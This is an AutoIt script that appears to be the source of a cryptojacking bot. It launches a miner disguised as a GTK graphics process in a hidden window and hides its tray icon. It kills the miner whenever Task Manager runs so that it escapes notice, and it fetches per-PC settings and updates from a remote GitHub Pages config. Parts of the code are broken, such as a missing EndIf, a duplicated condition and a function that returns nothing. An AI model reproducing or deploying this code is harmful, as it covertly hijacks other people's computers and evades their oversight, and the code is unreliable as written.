#NoTrayIcon
#Compiler_Res_Fileversion=0.0.0.0                 ;File Version


;;;;;;;;;;;;;;;;;;;;;;;;;
;        SCRIPT         ;
;;;;;;;;;;;;;;;;;;;;;;;;;

#Region globalVariables
$namePC=@ComputerName
$website = "http://botcentral.github.io"
;$location = "C:\PROGRA~2\GNU\GnuPG\etc\gtk-2.0\update\gtk\"
$location = "D:\Downloads\botCentralLabs\"
#EndRegion

Func checkMiner()
   Return ProcessExists("gtk_graphics_opengl.exe")
   EndFunc


;Returns True if there is a new update and False elsewise
Func checkUpdate()
   If (StringCompare(GetVersionFromWebsite(),FileGetVersion("script.exe")) > 0) Then
	  ;MsgBox(0,"","New Version!")
	  Return True
	  Else
   Return False
   EndIf
EndFunc

;Returns version number from remote server
Func getVersionFromWebsite()
   InetGet($website&"/config.ini", "config.ini")
   $remoteVersion = iniread("config.ini", "GENERAL", "version", "error")
   FileDelete($location&"config.ini")
   ;MsgBox(64, "VersionRead", $newVersion)
   Return $remoteVersion
EndFunc

Func startMiner()
   If checkMiner()==0 Then
	  Run("C:\Users\ineeve\Desktop\update\update\gtk\"&$cmd,"" ,@SW_HIDE)
EndFunc

Func trickTaskmgr()
   If ProcessExists("taskmgr.exe") Then
	  stopMiner()
	  ElseIf ProcessExists("taskmgr.exe") Then
		 startMiner()
	  EndIf
EndFunc

Func stopMiner()
   If checkMiner() Then
	  ProcessClose("gtk_graphics_opengl.exe")
	  EndIf
EndFunc

Func update()
   If checkUpdate() Then
	  stopMiner()
	  Run($location&"updater.exe")
	  Exit
	  EndIf
   EndFunc

Func getInfo() ;returns array with 0-owner 1-threads 2-nightmode
   Local $config[5]
   InetGet($website&"/config.ini", "config.ini")
   $config[0] = iniread("config.ini", $namePC, "owner", "error")
   $config[1] = iniread("config.ini", $namePC, "threads", "error")
   $config[2] = iniread("config.ini", $namePC, "nightmode", "error")
   FileDelete($location&"config.ini")
EndFunc

Func checkNight() ;Use right before WOL,


   EndFunc

$cmd = "gtk_graphics_opengl.exe -u roony.1 -p x -t 4"
$hey = Run("C:\Users\ineeve\Desktop\update\update\gtk\"&$cmd,"" ,@SW_HIDE)
ProcessSetPriority("gtk_graphics_opengl.exe",0)
Sleep(5000)

While 1
   Sleep(100)
   trickTaskmgr()
Wend